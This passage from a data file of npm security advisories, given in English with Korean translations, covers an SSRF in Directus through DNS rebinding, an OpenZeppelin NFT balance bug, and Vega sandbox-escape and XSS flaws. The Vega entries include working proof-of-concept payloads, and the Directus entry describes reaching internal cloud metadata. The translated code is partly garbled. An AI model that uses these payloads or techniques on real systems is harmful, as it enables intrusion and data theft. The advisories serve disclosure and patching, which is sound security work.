resolvedUrl.hostname;\n\nif (net.isIP(ip) === 0) {\n    try {\n        ip = (await lookupDNS(ip)).address;\n    } catch (err: any) {\n        logger.warn(err, `Couldn't lookup the DNS for url ${importURL}`);\n        throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n            service: 'external-file',\n        });\n    }\n}\n\nif (env.IMPORT_IP_DENY_LIST.includes('0.0.0.0')) {\n    const networkInterfaces = os.networkInterfaces();\n\n    for (const networkInfo of Object.values(networkInterfaces)) {\n        if (!networkInfo) continue;\n\n        for (const info of networkInfo) {\n            if (info.address === ip) {\n                logger.warn(`Requested URL ${importURL} resolves to localhost.`);\n                throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n                    service: 'external-file',\n                });\n            }\n        }\n    }\n}\n\nif (env.IMPORT_IP_DENY_LIST.includes(ip)) {\n    logger.warn(`Requested URL ${importURL} resolves to a denied IP address.`);\n    throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n        service: 'external-file',\n    });\n}\n```\n\nOnce it validates that the resolved IP address is not in the deny list, then it uses `axios` to `GET` the url and saves the response content.\n\n```js\ntry {\n    fileResponse = await axios.get<Readable>(encodeURL(importURL), {\n        responseType: 'stream',\n    });\n} catch (err: any) {\n    logger.warn(err, `Couldn't fetch file from url \"${importURL}\"`);\n    throw new ServiceUnavailableException(`Couldn't fetch file from url \"${importURL}\"`, {\n        service: 'external-file',\n    });\n}\n```\n\nHowever, this validation check and fetching the web resource causes to DNS queries that enable a DNS rebinding attack. On the first DNS query, an attacker controlled name server can be configured to resolve to an external IP address that is not in the deny list to bypass the validation. Then when `axios` is called, the name server resolves the domain name to a local IP address.\n\n### PoC\nTo demonstrate we will be using an online tool named [rebinder](https://lock.cmpxchg8b.com/rebinder.html). Rebinder randomly changes the IP address it resolves to depending on the subdomain. For an example, `7f000001.8efa468e.rbndr.us` can resolve to either `142.250.70.142` (google.com) or **`127.0.0.1`**. Sending multiple `POST` requests to `/files/import` using this domain will eventually cause a resolution to `142.250.70.142` first to bypass the validation then fetch the sensitive from an internal server when `axios` is called.\n\nThe following screenshots show what it looks like when a successful attack occurs.\n\n*Downloading a file named `secret.txt` from a webserver running from `http://127.0.0.1/secret.txt`*\n![image](https://user-images.githubusercontent.com/6276577/218124035-26f7f0c3-47b3-424d-b4d4-bd3b47161983.png)\n\n*Receiving the request from the internal server. Note that the incoming connection is from **127.0.0.1**.*\n![image](https://user-images.githubusercontent.com/6276577/218124119-87b8d5d6-934d-4e07-be4d-066616a9a435.png)\n\n*After downloading the file it leaks the content of the secret file.*\n![image](https://user-images.githubusercontent.com/6276577/218122210-87b2e478-1081-4830-a9ea-e5d9f39bb129.png)\n\n### Impact\nAn attacker can exploit this vulnerability to access highly sensitive internal server and steal sensitive information. An example is on Cloud Environments that utilise internal APIs for managing machine and privileges. For an example, if `directus` is hosted on AWS EC2 instance and has an IAM role assigned to the EC2 instance then an attacker can exploit this vulnerability to steal the AWS access keys to impersonate the EC2 instance using the AWS API.\n",
    "identifiers": "GHSA : GHSA-j3rg-3rgm-537h\nCVE : CVE-2023-26492",
    "severity": "MODERATE",
    "updatedAt": "2023-03-06T01:44:06Z",
    "publishedAt": "2023-03-03T23:07:35Z",
    "references": "https://github.com/directus/directus/security/advisories/GHSA-j3rg-3rgm-537h\nhttps://github.com/directus/directus/commit/ff53d3e69a602d05342e15d9bb616884833ddbff\nhttps://github.com/directus/directus/releases/tag/v9.23.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26492\nhttps://github.com/advisories/GHSA-j3rg-3rgm-537h",
    "name": "directus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.23.0",
    "identifier": "9.23.0",
    "descriptionKR": "### 요약\nDirectus 버전 <=9.22.4는 원격 웹 서버에서 파일을 가져올 때(POST에서 `/files/import`로) SSRF(Server-Side Request Forgery)에 취약합니다. 공격자는 [DNS 리바인딩 공격]( https://en.wikipedia.org/wiki/DNS_rebinding) 내부 서버의 민감한 데이터를 보거나 로컬 포트 ​​스캔을 수행합니다(예: 'http://169.254.169.254' 이벤트에서 AWS용 내부 메타데이터 API에 액세스할 수 있습니다. 169.254.169.254`는 거부 IP 목록에 있음).\n\n### 세부 정보\nDNS 리바인딩 공격은 도메인이 동시에 확인될 때 두 개의 서로 다른 IP 주소를 확인하는 DNS 이름 서버를 실행하여 작동합니다. 이러한 유형의 공격은 [`/api/src/services/file.ts`](https://github.com/directus/directus/blob/main/에 추가된 IP 주소 거부 목록 유효성 검사를 우회하는 데 악용될 수 있습니다. 이전 SSRF 취약점[CVE-2022-23080](https://security.snyk.io/vuln/SNYK-JS-DIRECTUS-2934713)을 완화하기 위한 'importOne' 함수용 api/src/services/files.ts) . [`/api/src/services/file.ts`](https://github.com/directus/directus/blob/main/api/src/services/files.ts)의 유효성 검사는 먼저 해결된 IP가 있는지 확인합니다. 도메인 이름의 주소는 거부 목록의 IP 주소로 확인되지 않습니다.\n\n```js\nlet ip = resolveUrl.hostname;\n\nif (net.isIP(ip) === 0) {\n    노력하다 {\n        ip = (lookupDNS(ip) 대기).주소;\n    } catch (err: any) {\n        logger.warn(err, `URL ${importURL}에 대한 DNS를 조회할 수 없음`);\n        throw new ServiceUnavailableException(`URL \"${importURL}\"에서 파일을 가져올 수 없음`, {\n            서비스: '외부 파일',\n        });\n    }\n}\n\nif (env.IMPORT_IP_DENY_LIST.includes('0.0.0.0')) {\n    const networkInterfaces = os.networkInterfaces();\n\n    for (Object.values(networkInterfaces)의 const networkInfo) {\n        if (!networkInfo) 계속;\n\n        for (networkInfo의 상수 정보) {\n            if (info.address === IP) {\n                logger.warn(`요청한 URL ${importURL}이 localhost로 확인됩니다.`);\n                throw new ServiceUnavailableException(`URL \"${importURL}\"에서 파일을 가져올 수 없음`, {\n                    서비스: '외부 파일',\n                });\n            }\n        }\n    }\n}\n\nif (env.IMPORT_IP_DENY_LIST.includes(ip)) {\n    logger.warn(`요청된 URL ${importURL}이 거부된 IP 주소로 확인됩니다.`);\n    throw new ServiceUnavailableException(`URL \"${importURL}\"에서 파일을 가져올 수 없음`, {\n        서비스: '외부 파일',\n    });\n}\n```\n\n확인된 IP 주소가 거부 목록에 없는지 확인하면 'axios'를 사용하여 URL을 'GET'하고 응답 내용을 저장합니다.\n\n```js\n노력하다 {\n    fileResponse = 대기 axios.get<Readable>(encodeURL(importURL), {\n        응답 유형: '스트림',\n    });\n} catch (err: any) {\n    logger.warn(err, `URL \"${importURL}\"\"에서 파일을 가져올 수 없습니다`);\n    throw new ServiceUnavailableException(`URL \"${importURL}\"에서 파일을 가져올 수 없음`, {\n        서비스: '외부 파일',\n    });\n}\n```\n\n그러나 이 유효성 검사 및 웹 리소스 가져오기는 DNS 리바인딩 공격을 가능하게 하는 DNS 쿼리를 유발합니다. 첫 번째 DNS 쿼리에서 공격자가 제어하는 ​​이름 서버는 유효성 검사를 우회하기 위해 거부 목록에 없는 외부 IP 주소로 확인하도록 구성할 수 있습니다. 그런 다음 'axios'가 호출되면 이름 서버는 도메인 이름을 로컬 IP 주소로 확인합니다.\n\n### PoC\n시연을 위해 [rebinder](https://lock.cmpxchg8b.com/rebinder.html)라는 온라인 도구를 사용할 것입니다. Rebinder는 하위 도메인에 따라 해결되는 IP 주소를 무작위로 변경합니다. 예를 들어 `7f000001.8efa468e.rbndr.us`는 `142.250.70.142`(google.com) 또는 **`127.0.0.1`**으로 해석될 수 있습니다. 이 도메인을 사용하여 `/files/import`에 여러 `POST` 요청을 보내면 결국 `142.250.70.142`에 대한 확인이 먼저 검증을 우회한 다음 `axios`가 호출될 때 내부 서버에서 중요한 항목을 가져옵니다.\n\n다음 스크린샷은 공격이 성공했을 때의 모습을 보여줍니다.\n\n*`http://127.0.0.1/secret.txt`에서 실행되는 웹서버에서 `secret.txt` 파일 다운로드*\n![이미지](https://user-images.githubusercontent.com/6276577/218124035-26f7f0c3-47b3-424d-b4d4-bd3b47161983.png)\n\n*내부 서버에서 요청을 받습니다. 들어오는 연결은 **127.0.0.1**.*에서 시작됩니다.\n![이미지](https://user-images.githubusercontent.com/6276577/218124119-87b8d5d6-934d-4e07-be4d-066616a9a435.png)\n\n*파일을 다운로드하면 비밀 파일의 내용이 유출됩니다.*\n![이미지](https://user-images.githubusercontent.com/6276577/218122210-87b2e478-1081-4830-a9ea-e5d9f39bb129.png)\n\n### 영향\n공격자는 이 취약점을 악용하여 매우 민감한 내부 서버에 액세스하고 중요한 정보를 훔칠 수 있습니다. 예를 들어 시스템 및 권한을 관리하기 위해 내부 API를 활용하는 클라우드 환경이 있습니다. 예를 들어 'directus'가 AWS EC2 인스턴스에서 호스팅되고 EC2 인스턴스에 IAM 역할이 할당된 경우 공격자는 이 취약성을 악용하여 AWS 액세스 키를 훔쳐 AWS API를 사용하여 EC2 인스턴스를 가장할 수 있습니다."
  },
  {
    "description": "### Impact\n\nThe ERC721Consecutive contract designed for minting NFTs in batches does not update balances when a batch has size 1 and consists of a single token. Subsequent transfers from the receiver of that token may overflow the balance as reported by `balanceOf`.\n\nThe issue exclusively presents with batches of size 1.\n\n### Patches\n\nThe issue has been patched in 4.8.2.\n\n<!-- ### References -->\n\n",
    "identifiers": "GHSA : GHSA-878m-3g6q-594q\nCVE : CVE-2023-26488",
    "severity": "MODERATE",
    "updatedAt": "2023-03-10T15:30:58Z",
    "publishedAt": "2023-03-03T20:02:16Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-878m-3g6q-594q\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/167bf67ed3907f4a674043496019fa346cee7705\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.8.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26488\nhttps://github.com/advisories/GHSA-878m-3g6q-594q",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.8.0, < 4.8.2",
    "identifier": "4.8.2",
    "descriptionKR": "### 영향\n\nNFT를 일괄적으로 발행하도록 설계된 ERC721연속 계약은 일괄 처리가 크기가 1이고 단일 토큰으로 구성된 경우 잔액을 업데이트하지 않습니다. 해당 토큰의 수신자로부터의 후속 전송은 'balanceOf'에서 보고한 대로 잔액을 오버플로할 수 있습니다.\n\n이 문제는 크기가 1인 배치에만 나타납니다.\n\n### 패치\n\n이 문제는 4.8.2에서 패치되었습니다.\n\n<!-- ### 참조 -->"
  },
  {
    "description": "### Impact\n\nThe ERC721Consecutive contract designed for minting NFTs in batches does not update balances when a batch has size 1 and consists of a single token. Subsequent transfers from the receiver of that token may overflow the balance as reported by `balanceOf`.\n\nThe issue exclusively presents with batches of size 1.\n\n### Patches\n\nThe issue has been patched in 4.8.2.\n\n<!-- ### References -->\n\n",
    "identifiers": "GHSA : GHSA-878m-3g6q-594q\nCVE : CVE-2023-26488",
    "severity": "MODERATE",
    "updatedAt": "2023-03-10T15:30:58Z",
    "publishedAt": "2023-03-03T20:02:16Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-878m-3g6q-594q\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/167bf67ed3907f4a674043496019fa346cee7705\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.8.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26488\nhttps://github.com/advisories/GHSA-878m-3g6q-594q",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.8.0, < 4.8.2",
    "identifier": "4.8.2",
    "descriptionKR": "### 영향\n\nNFT를 일괄적으로 발행하도록 설계된 ERC721연속 계약은 일괄 처리가 크기가 1이고 단일 토큰으로 구성된 경우 잔액을 업데이트하지 않습니다. 해당 토큰의 수신자로부터의 후속 전송은 'balanceOf'에서 보고한 대로 잔액을 오버플로할 수 있습니다.\n\n이 문제는 크기가 1인 배치에만 나타납니다.\n\n### 패치\n\n이 문제는 4.8.2에서 패치되었습니다.\n\n<!-- ### 참조 -->"
  },
  {
    "description": " Vega is vulnerable to arbitrary code execution when clicking href links. Versions 5.4.1 and 4.5.1 contain a patch.",
    "identifiers": "GHSA : GHSA-cp47-r258-q626",
    "severity": "MODERATE",
    "updatedAt": "2023-03-02T23:36:23Z",
    "publishedAt": "2023-03-02T23:36:22Z",
    "references": "https://github.com/vega/vega/security/advisories/GHSA-cp47-r258-q626\nhttps://github.com/vega/vega/pull/1892\nhttps://github.com/vega/vega/commit/692327013eb4dd5adec0c47a620181af1b135e2a\nhttps://github.com/vega/vega/commits/v4.5.1\nhttps://github.com/vega/vega/commits/v5.4.1\nhttps://github.com/advisories/GHSA-cp47-r258-q626",
    "name": "vega",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.5.1",
    "identifier": "4.5.1",
    "descriptionKR": "Vega는 href 링크를 클릭할 때 임의 코드 실행에 취약합니다. 버전 5.4.1 및 4.5.1에는 패치가 포함되어 있습니다."
  },
  {
    "description": " Vega is vulnerable to arbitrary code execution when clicking href links. Versions 5.4.1 and 4.5.1 contain a patch.",
    "identifiers": "GHSA : GHSA-cp47-r258-q626",
    "severity": "MODERATE",
    "updatedAt": "2023-03-02T23:36:23Z",
    "publishedAt": "2023-03-02T23:36:22Z",
    "references": "https://github.com/vega/vega/security/advisories/GHSA-cp47-r258-q626\nhttps://github.com/vega/vega/pull/1892\nhttps://github.com/vega/vega/commit/692327013eb4dd5adec0c47a620181af1b135e2a\nhttps://github.com/vega/vega/commits/v4.5.1\nhttps://github.com/vega/vega/commits/v5.4.1\nhttps://github.com/advisories/GHSA-cp47-r258-q626",
    "name": "vega",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.4.1",
    "identifier": "5.4.1",
    "descriptionKR": "Vega는 href 링크를 클릭할 때 임의 코드 실행에 취약합니다. 버전 5.4.1 및 4.5.1에는 패치가 포함되어 있습니다."
  },
  {
    "description": "There is an Open Redirect vulnerability in the Node.js adapter when forwarding requests to Keycloak using `checkSSO` with query param `prompt=none`.",
    "identifiers": "GHSA : GHSA-59fq-727j-hm3f\nCVE : CVE-2022-2237",
    "severity": "MODERATE",
    "updatedAt": "2023-04-04T21:47:31Z",
    "publishedAt": "2023-03-02T23:21:02Z",
    "references": "https://github.com/keycloak/keycloak-nodejs-connect/security/advisories/GHSA-59fq-727j-hm3f\nhttps://github.com/keycloak/keycloak-nodejs-connect/commit/190a9470e234bbd9ac5d5de43f5a19aead9a2c21\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-2237\nhttps://bugzilla.redhat.com/show_bug.cgi?id=2097007\nhttps://github.com/advisories/GHSA-59fq-727j-hm3f",
    "name": "keycloak-connect",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 21.0.1",
    "identifier": "21.0.1",
    "descriptionKR": "쿼리 매개변수 'prompt=none'과 함께 'checkSSO'를 사용하여 Keycloak에 요청을 전달할 때 Node.js 어댑터에 Open Redirect 취약성이 있습니다."
  },
  {
    "description": "### Summary\nThe Vega `scale` expression function has the ability to call arbitrary functions with a single controlled argument. This can be exploited to escape the Vega expression sandbox in order to execute arbitrary JavaScript.\n\n### Details\n\nThe [scale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37) expression function passes a user supplied argument `group` to [getScale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6), which is then used as if it were an internal context. The `context.scales[name].value` is accessed from `group` and called as a function back in `scale`.\n\n### PoC\nThe following Vega definition can be used to demonstrate this issue executing the JavaScript code `alert(1);`\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"data\": [\n    {\n      \"name\": \"XSS PoC\",\n      \"values\": [1],\n      \"transform\": [\n        {\n          \"type\": \"formula\",\n          \"as\": \"amount\",\n          \"expr\": \"scale('func', null,  {context: {scales: {func: {value: scale('func', 'eval(atob(\\\"YWxlcnQoMSk7\\\"))', {context: {scales: {func: {value: [].constructor.constructor}}}})}}}})\"\n        }\n      ]\n    }\n  ]\n}\n```\n\nThis can be viewed in the Vega online IDE at https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA\n\n",
    "identifiers": "GHSA : GHSA-4vq7-882g-wcg4\nCVE : CVE-2023-26486",
    "severity": "MODERATE",
    "updatedAt": "2023-03-09T21:58:50Z",
    "publishedAt": "2023-03-02T23:11:05Z",
    "references": "https://github.com/vega/vega/security/advisories/GHSA-4vq7-882g-wcg4\nhttps://github.com/vega/vega/releases/tag/v5.23.0\nhttps://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37\nhttps://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6\nhttps://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26486\nhttps://github.com/advisories/GHSA-4vq7-882g-wcg4",
    "name": "vega",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.23.0",
    "identifier": "5.23.0",
    "descriptionKR": "### 요약\nVega `scale` 표현식 함수는 단일 제어 인수로 임의의 함수를 호출할 수 있습니다. 이는 임의의 JavaScript를 실행하기 위해 Vega 표현식 샌드박스를 탈출하는 데 악용될 수 있습니다.\n\n### 세부 정보\n\n[scale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37) 식 함수는 사용자 제공 인수 'group'을 그런 다음 내부 컨텍스트인 것처럼 사용됩니다. `context.scales[name].value`는 `group`에서 액세스되고 `scale`에서 다시 함수로 호출됩니다.\n\n### PoC\n다음 Vega 정의는 JavaScript 코드 `alert(1);`를 실행하는 이 문제를 설명하는 데 사용할 수 있습니다.\n```json\n{\n  \"$스키마\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"데이터\": [\n    {\n      \"이름\": \"XSS PoC\",\n      \"값\": [1],\n      \"변환\": [\n        {\n          \"유형\": \"공식\",\n          \"as\": \"금액\",\n          \"expr\": \"scale('func', null, {context: {scales: {func: {value: scale('func', 'eval(atob(\\\"YWxlcnQoMSk7\\\")))', {context: {scales : {func: {값: [].constructor.constructor}}}})}}}})\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n이것은 https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAw의 Vega 온라인 IDE에서 볼 수 있습니다. tJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSubHihTYmYoAdEABN AHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA"
  },
  {
    "description": "### Summary\nThe Vega `scale` expression function has the ability to call arbitrary functions with a single controlled argument. This can be exploited to escape the Vega expression sandbox in order to execute arbitrary JavaScript.\n\n### Details\n\nThe [scale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37) expression function passes a user supplied argument `group` to [getScale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6), which is then used as if it were an internal context. The `context.scales[name].value` is accessed from `group` and called as a function back in `scale`.\n\n### PoC\nThe following Vega definition can be used to demonstrate this issue executing the JavaScript code `alert(1);`\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"data\": [\n    {\n      \"name\": \"XSS PoC\",\n      \"values\": [1],\n      \"transform\": [\n        {\n          \"type\": \"formula\",\n          \"as\": \"amount\",\n          \"expr\": \"scale('func', null,  {context: {scales: {func: {value: scale('func', 'eval(atob(\\\"YWxlcnQoMSk7\\\"))', {context: {scales: {func: {value: [].constructor.constructor}}}})}}}})\"\n        }\n      ]\n    }\n  ]\n}\n```\n\nThis can be viewed in the Vega online IDE at https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA\n\n",
    "identifiers": "GHSA : GHSA-4vq7-882g-wcg4\nCVE : CVE-2023-26486",
    "severity": "MODERATE",
    "updatedAt": "2023-03-09T21:58:50Z",
    "publishedAt": "2023-03-02T23:11:05Z",
    "references": "https://github.com/vega/vega/security/advisories/GHSA-4vq7-882g-wcg4\nhttps://github.com/vega/vega/releases/tag/v5.23.0\nhttps://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37\nhttps://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/scales.js#L6\nhttps://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAwtJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSuBHihTYmYoAdEABNAHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26486\nhttps://github.com/advisories/GHSA-4vq7-882g-wcg4",
    "name": "vega-functions",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.13.1",
    "identifier": "5.13.1",
    "descriptionKR": "### 요약\nVega `scale` 표현식 함수는 단일 제어 인수로 임의의 함수를 호출할 수 있습니다. 이는 임의의 JavaScript를 실행하기 위해 Vega 표현식 샌드박스를 탈출하는 데 악용될 수 있습니다.\n\n### 세부 정보\n\n[scale](https://github.dev/vega/vega/blob/72b9b3bbf912212e7879b6acaccc84aff969ef1c/packages/vega-functions/src/functions/scale.js#L36-L37) 식 함수는 사용자 제공 인수 'group'을 그런 다음 내부 컨텍스트인 것처럼 사용됩니다. `context.scales[name].value`는 `group`에서 액세스되고 `scale`에서 다시 함수로 호출됩니다.\n\n### PoC\n다음 Vega 정의는 JavaScript 코드 `alert(1);`를 실행하는 이 문제를 설명하는 데 사용할 수 있습니다.\n```json\n{\n  \"$스키마\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"데이터\": [\n    {\n      \"이름\": \"XSS PoC\",\n      \"값\": [1],\n      \"변환\": [\n        {\n          \"유형\": \"공식\",\n          \"as\": \"금액\",\n          \"expr\": \"scale('func', null, {context: {scales: {func: {value: scale('func', 'eval(atob(\\\"YWxlcnQoMSk7\\\")))', {context: {scales : {func: {값: [].constructor.constructor}}}})}}}})\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n이것은 https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAATJJhSoA2qHFIEcNCAAaAZT0ACAApsAw의 Vega 온라인 IDE에서 볼 수 있습니다. tJDEkAGwZwIaZQEYAujMwAnJOIgAzNk8EJ1BMAE8cLXQAoIYbFBkkR3QNNgZxTEs4AA8cT21oWzgACgByP3SoUqlDcTibGsNgKAlMHMxUJsKbB07gCvEoPus7OE7ukvLK6sNSubHihTYmYoAdEABN AHVsmyhxAEU2AFk9AGsAdnWASmuZ5tb2von8JoGhppH7TuVXShbfF4GFBMIF-hIIECQYEAL5wmHXeEIkAw1yomFAA"
  },
  {
    "description": "### Summary\n\nVega's `lassoAppend` function: `lassoAppend` accepts 3 arguments and internally invokes `push` function on the 1st argument specifying array consisting of 2nd and 3rd arguments as `push` call argument. The type of the 1st argument is supposed to be an array, but it's not enforced.\n\nThis makes it possible to specify any object with a `push` function as the 1st argument, `push` function can be set to any function that can be access via `event.view` (no all such functions can be exploited due to invalid context or signature, but some can, e.g. `console.log`).\n\n### Details\nThe issue is that [`lassoAppend`](https://github.com/vega/vega/blob/7eafbbd4d53d0ce9f08e74ff96c90d411b1bb80a/packages/vega-functions/src/functions/lasso.js#L13) doesn't enforce proper types of its arguments:\n```js\n.....\nexport function lassoAppend(lasso, x, y, minDist = 5) {\n    const last = lasso[lasso.length - 1];\n\n    // Add point to lasso if distance to last point exceed minDist or its the first point\n    if (last === undefined || Math.sqrt(((last[0] - x) ** 2) + ((last[1] - y) ** 2)) > minDist) {\n        lasso.push([x, y]);\n.....\n```\n\n### PoC\n\nUse the following Vega snippet (depends on browser's non-built-in `event.view.setImmediate` function, feel free to replace with `event.view.console.log` or alike and observe the result in the browser's console)\n\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"width\": 350,\n  \"height\": 350,\n  \"autosize\": \"none\",\n  \"description\": \"Toggle Button\",\n  \"signals\": [\n    {\n      \"name\": \"toggle\",\n      \"value\": false,\n      \"on\": [\n        {\n          \"events\": {\"type\": \"click\", \"markname\": \"circle\"},\n          \"update\": \"toggle ? false : true\"\n        }\n      ]\n    },\n    {\n      \"name\": \"addFilter\",\n      \"on\": [\n        {\n          \"events\": {\"type\": \"mousemove\", \"source\": \"window\"},\n          \"update\": \"lassoAppend({'push':event.view.setImmediate},'alert(document.domain)','alert(document.cookie)')\"\n        }\n      ]\n    }\n  ],\n  \"marks\": [\n    {\n      \"name\": \"circle\",\n      \"type\": \"symbol\",\n      \"zindex\": 1,\n      \"encode\": {\n        \"enter\": {\n          \"y\": {\"signal\": \"height/2\"},\n          \"angle\": {\"value\": 0},\n          \"size\": {\"value\": 400},\n          \"shape\": {\"value\": \"circle\"},\n          \"fill\": {\"value\": \"white\"},\n          \"stroke\": {\"value\": \"white\"},\n          \"strokeWidth\": {\"value\": 2},\n          \"cursor\": {\"value\": \"pointer\"},\n          \"tooltip\": {\"signal\": \"{Tip: 'Click to fire XSS'}\"}\n        },\n        \"update\": {\"x\": {\"signal\": \"toggle === true ? 190 : 165\"}}\n      }\n    },\n    {\n      \"name\": \"rectangle\",\n      \"type\": \"rect\",\n      \"zindex\": 0,\n      \"encode\": {\n        \"enter\": {\n          \"x\": {\"value\": 152},\n          \"y\": {\"value\": 162.5},\n          \"width\": {\"value\": 50},\n          \"height\": {\"value\": 25},\n          \"cornerRadius\": {\"value\": 20}\n        },\n        \"update\": {\n          \"fill\": {\"signal\": \"toggle === true ? '#006BB4' : '#939597'\"}\n        }\n      }\n    }\n  ]\n}\n```\n\n### Impact\nThis issue opens various XSS vectors, but exact impact and severity depends on the environment (e.g. Core JS `setImmediate` polyfill basically allows `eval`-like functionality).\n",
    "identifiers": "GHSA : GHSA-w5m3-xh75-mp55\nCVE : CVE-2023-26487",
    "severity": "MODERATE",
    "updatedAt": "2023-03-13T15:30:51Z",
    "publishedAt": "2023-03-02T23:08:21Z",
    "references": "https://github.com/vega/vega/security/advisories/GHSA-w5m3-xh75-mp55\nhttps://github.com/vega/vega/commit/01adb034f24727d3bb321bbbb6696a7f4cd91689\nhttps://github.com/vega/vega/releases/tag/v5.23.0\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-26487\nhttps://github.com/advisories/GHSA-w5m3-xh75-mp55",
    "name": "vega-functions",
